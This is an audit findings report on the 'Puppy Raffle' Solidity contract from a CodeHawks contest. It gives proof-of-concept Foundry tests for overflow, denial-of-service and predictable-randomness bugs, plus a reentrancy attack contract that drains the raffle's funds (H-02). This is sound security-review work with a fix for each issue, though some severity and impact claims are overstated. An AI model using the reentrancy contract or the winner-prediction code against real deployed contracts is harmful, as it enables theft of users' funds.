# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Uint64 overflow results in zero prize for owner](#H-01)
    - ### [H-02. refund() is prone to reentrancy attack](#H-02)
    - ### [H-03. players[] doesn't correctly update the players ](#H-03)
    - ### [H-04. selectWinner() is not ownable, prone to manipulations](#H-04)
    - ### [H-05. enterRaffle() can result in "Out of Gas" error](#H-05)
    - ### [H-06. enterRaffle() not checking 0-size array results in DoS](#H-06)
    - ### [H-07. selectWinner() can be misused to predict the winner in advance](#H-07)

- ## Low Risk Findings
    - ### [L-01. getActivePlayerIndex() returns ambigious results](#L-01)
    - ### [L-02. Unnecessary initialization of totalFees](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 7
   - Medium: 0
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Uint64 overflow results in zero prize for owner            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L134

## Summary
If there are many players in the game expected prize for the owner may become zero.
## Vulnerability Details
The code uses Solidity `0.7.6`. In this version there is no automatic checks for integer over- / underflows. `totalFees` is explicitly defined as `uint64` which means that every value greater than `18,446,744,073,709,551,615` will result in overflow. Here is the test which shows the exploit: 
```
function testWithdrawFees() public manyPlayersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // expectedPrizeAmount = 18,600,000,000,000,000,000
    // type(uint64).max = 18,446,744,073,709,551,615
    uint256 expectedPrizeAmount = ((entranceFee * 93) * 20) / 100;

    console.log("Expected price amount: %s ", expectedPrizeAmount);

    puppyRaffle.selectWinner();
    console.log("feeAddress balance: %s", address(feeAddress).balance);
    console.log("Entrance fee: %s", entranceFee);
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}

modifier manyPlayersEntered() {
    uint256 totalPlayers = 93;
    address[] memory players = new address[](totalPlayers);
    for (uint256 i; i < totalPlayers; i++) {
        players[i] = address(i * 3000);
    }
    puppyRaffle.enterRaffle{value: entranceFee * totalPlayers}(players);
    _;
}
```
## Impact
High. It is easy to calculate, even manually which amount combination of number of players and entrance fee will result in the overflow.
## Tools Used
Manual check.
## Recommendations
- Automatic over- and underflow checks were introduced in [Solidity 0.8.0](https://docs.soliditylang.org/en/latest/080-breaking-changes.html). Use the latest Solidity version. This will require a review of project's dependences as not all of them work with Solidity >= 0.8.0.
- Use safe math libraries like the one from OpenZeppelin [Math](https://docs.openzeppelin.com/contracts/2.x/api/math).
## <a id='H-02'></a>H-02. refund() is prone to reentrancy attack            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L101

## Summary
A malicious smart contract can call `refund()` and drain all the funds from `PuppyRaffle`.
## Vulnerability Details
It's possible to reenter `refund()` with the following attacker's smart contract: 
```
//SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

// I'm attack contract. I like ETH and don't like dogs.
contract Attack {
    address private immutable puppyRaffleAddress;

    constructor(address _puppyRaffleAddress) {
        puppyRaffleAddress = _puppyRaffleAddress;
    }

    // simulate response from ERC721 Receiver to avoid revert
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return 0x150b7a02;
    }

    receive() external payable {
        // specify lower limit in order to avoid revert. In this example it's 0.2 ETH.
        if ((puppyRaffleAddress).balance > 0.2 ether) {
            PuppyRaffle(puppyRaffleAddress).refund(3);
        }
    }
}
```
Here is a test for the attack:
```
Attack attack1;
Attack attack2;
Attack attack3;
Attack attack4;

...

function setUp() public {
    puppyRaffle = new PuppyRaffle(
        entranceFee,
        feeAddress,
        duration
    );

    attack1 = new Attack(address(puppyRaffle));
    attack2 = new Attack(address(puppyRaffle));
    attack3 = new Attack(address(puppyRaffle));
    attack4 = new Attack(address(puppyRaffle));
}
```

```
function testCanPerformReentrancyAttack() public {
    address[] memory players = new address[](4);
    players[0] = address(attack1);
    players[1] = address(attack2);
    players[2] = address(attack3);
    players[3] = address(attack4);

    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    console.log("PuppyRaffle balance before: %s", address(puppyRaffle).balance);
    console.log("Attacker balance before: %s", address(attack4).balance);

    vm.prank(address(attack4));
    puppyRaffle.refund(3);

    console.log("PuppyRaffle balance after: %s", address(puppyRaffle).balance);
    console.log("Attacker balance after: %s", address(attack4).balance);
}
```
## Impact
High. The attacker can steal all the funds.
## Tools Used
Manual check.
## Recommendations
- Follow *checks-effects-interactions pattern*. In this case, move `players[playerIndex] = address(0);` before the external call:
```
...
players[playerIndex] = address(0);
payable(msg.sender).sendValue(entranceFee);
...
```
- Use a reentrancy guard https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard
## <a id='H-03'></a>H-03. players[] doesn't correctly update the players             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L88

## Summary
Removal of players using `refund()` method creates gaps inside the `players[]` array. 
## Vulnerability Details
The main problem is that nested loop performs check of duplicates as follows: 
```
require(players[i] != players[j], "PuppyRaffle: Duplicate player");
```
So, if more than 1 player is removed `enterRaffle()` will revert and it'll not be possible to add new players. Here is a test:
```
function testCanEnterRaffleAndRemove() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.prank(playerTwo);
        puppyRaffle.refund(1);
        vm.prank(playerThree);
        puppyRaffle.refund(2);

        // actually there are two elements
        assertFalse(puppyRaffle.getPlayersLength() == 2);

        // however the length is not updated
        assertEq(puppyRaffle.getPlayersLength(), 4);

        address[] memory readdedPlayers = new address[](3);
        readdedPlayers[0] = playerThree;
        readdedPlayers[1] = address(11);
        readdedPlayers[2] = address(12);

        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(readdedPlayers);
}
```
I created a helper `getPlayersLength()` as follows:
```
function getPlayersLength() public view returns (uint256) {
        return players.length;
}
```
It's a view function and doesn't affect the smart contract, but could be useful for testing purposes.
## Impact
High. The vulnerability can break game workflow.
## Tools Used
Manual check.
## Recommendations
Avoid loops. Especially nested loops. Instead use `mapping(uint256 => address)` for tracking players.
## <a id='H-04'></a>H-04. selectWinner() is not ownable, prone to manipulations            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L125

## Summary
`selectWinner()` can be called by anyone. 
## Vulnerability Details
As anyone can call `selectWinner()` and because of the issues with random number generation it's possible to manipulate with the list of players. The the attacker could add addresses until (one of) his addresses will have the `winnerIndex`. After that the attacker could call `selectWinner()` and take funds. 
## Impact
High. Allows to easily commit fraud. 
## Tools Used
Manual check. 
## Recommendations
- Use `onlyOwner` modifier. 
- Use verified source of randomness, e.g. [Chainlink VRF](https://docs.chain.link/vrf).
## <a id='H-05'></a>H-05. enterRaffle() can result in "Out of Gas" error            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L79

## Summary
`enterRaffle()` consumes a lot of gas which can result in DoS and "out of gas" error.
## Vulnerability Details
`entherRaffle()` uses loops and nested loops in for iterating the `players` array. This results in longer function execution and potential `out of gas` problem. The test will not revert because Foundry has a [very high gas limit](https://book.getfoundry.sh/reference/config/testing?#gas_limit). The following:
```
function testCanEnterRaffleRunOutOfGas() public {
   uint64 playerNum = 64;
   address[] memory players = new address[](playerNum);
   for (uint64 i = 0; i < playerNum; i++) {
      players[i] = address(i);
   }
   puppyRaffle.enterRaffle{value: entranceFee * playerNum}(players);
   assertEq(puppyRaffle.players(0), address(0));
   assertEq(puppyRaffle.players(playerNum - 1), address(playerNum - 1));
}
```
shows how quickly used gas is increased:
```
|number of players|gas used|
----------------------------
|                2|   68900|
|               16|  491158|
|               32| 1163116|
|               64| 3113002|
```
## Impact
High. The attacker may easily discover this vulnerability and perform a denial-of-service attack because the function takes a lot of time to iterate through the loops.  
## Tools Used
Manual check. 
## Recommendations
Avoid loops and especially nested loops. Refactor the contract to use a ```mapping(uint256 => address) players``` instead of an array. 
## <a id='H-06'></a>H-06. enterRaffle() not checking 0-size array results in DoS            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L79

## Summary
No check is made for an empty array in `enterRaffle()`.
## Vulnerability Details
If an argument of `enterRaffle()` is a zero-size array the function gets stuck. The following test can demonstrate the issue and will basically freeze the contract: 
```
function testCanEnterWithoutPlayers() public {
   address[] memory players = new address[](0);
   puppyRaffle.enterRaffle(players);
}
```
## Impact
High. Vulnerability can be used to perform denial-of-service.
## Tools Used
Manual check.
## Recommendations
Revert, if an empty array is provided in args: 
```
require(newPlayers.length > 0, "PuppyRaffle: no players");
```
## <a id='H-07'></a>H-07. selectWinner() can be misused to predict the winner in advance            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L125

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L139

## Summary
`selectWinner()` depends on known / predictable inputs.
## Vulnerability Details
The function depends on `msg.sender`, `block.timestamp` and `block.difficulty`. That allows to predict a result of `winnerIndex` quite easily.

Sample test to reproduce the vulnerability:
```
function testPwnSelectWinner() public playersEntered {
   vm.warp(block.timestamp + duration + 1);
   vm.roll(block.number + 1);

   uint256 cheatWinnerIndex = uint256(
   keccak256(abi.encodePacked(msg.sender, block.timestamp + 1, block.difficulty))) 
   % puppyRaffle.getPlayersLength();

   address cheatWinner = puppyRaffle.getPlayerAt(cheatWinnerIndex);

   puppyRaffle.selectWinner();

   assertEq(puppyRaffle.previousWinner(), playerFour);
   assertEq(cheatWinner, playerFour);
}
```
Need to add the following methods to `PuppyRaffle.sol`:
```
function getPlayersLength() public view returns (uint256) {
   return players.length;
}

function getPlayerAt(uint256 index) public view returns (address) {
   return players[index];
}
```
Although the comment on line 138 and code on line 139: 
```
// We use a different RNG calculate from the winnerIndex to determine rarity
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```
state that a different random function is used, rarity generation still has the same predictability problem, because the parameters for random function generation are still publicly available. 
## Impact
High. Exploit is easy to reproduce and allows for cheating during the winner selection process. 
## Tools Used
Manual check.
## Recommendations
Select a different, verified source of randomness, for example [Chainlink VRF](https://docs.chain.link/vrf).
		


# Low Risk Findings

## <a id='L-01'></a>L-01. getActivePlayerIndex() returns ambigious results            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L110

## Summary
`getActivePlayerIndex()` returns `0` in two different cases.
## Vulnerability Details
In one case `0` is returned when the first player has the address equal to the function's argument. In another case `0` is returned when no elements are found. 
## Impact
Low. The usage of this method can lead to unexpected bugs where extra debugging is required. However, the function is not used anywhere in the contract.
## Tools Used
Manual check.
## Recommendations
It's better to start with `players[]` and rewrite the contract, so that the mapping is used instead of array. Mapping will help to resolve current and some other issues. 
## <a id='L-02'></a>L-02. Unnecessary initialization of totalFees            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L30

## Summary
`totalFees` doesn't need to be explicitly initialized.
## Vulnerability Details
`totalFees = 0` is unnecessary operation, because the value of `uint64` is zero by default
## Impact
Low. Not a security issue, but takes extra gas for writing to storage.
## Tools Used
Manual check.
## Recommendations
Don't initialize explicitly. The following would work:
```
totalFees;
```


